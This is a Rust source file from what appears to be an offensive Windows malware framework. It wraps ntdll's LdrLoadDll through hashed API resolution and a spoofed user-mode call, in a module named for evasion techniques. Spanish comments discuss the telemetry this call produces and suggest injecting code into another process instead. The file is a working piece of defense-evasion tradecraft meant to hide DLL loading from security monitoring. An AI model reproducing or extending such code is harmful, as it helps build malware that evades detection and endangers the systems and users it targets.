use crate::nt::types::*;
use crate::techniques::evasion::dinamic_api_resolution::get_ntdll_base;
use crate::techniques::evasion::execution::user_mode_call::user_mode_call_with_spoof;

//https://ntdoc.m417z.com/ldrloaddll

//implementar esta funcion para cargar una dll no es una buena practica en malware dado que genera mucha telemetria, lo suyo seria inyectar codigo a un proceso que ya tenga cargada la dll y asi no haces loadlibrary
pub fn ldr_load_dll(
    //llamada a el loader de dlls de windows
    dll_path: PCWSTR,            //in_opt
    dll_characteristics: PULONG, //in_opt
    dll_name: PCUNICODE_STRING,  //in
    dll_handle: PHANDLE,         //out
) -> Result<usize, String> {
    let api_hash = 0x5338cf9d;
    let ntdll = unsafe { get_ntdll_base()? };

    let status = user_mode_call_with_spoof(
        ntdll,
        api_hash,
        dll_path as usize,
        dll_characteristics as usize,
        dll_name as usize,
        dll_handle as usize,
        0,
        0,
        0,
        0,
    );

    match status {
        Ok(0) => Ok(0),
        Ok(code) => Err(format!("ldr_load_dll devolvió NTSTATUS: {:#X}", code)),
        Err(e) => Err(e),
    }
}
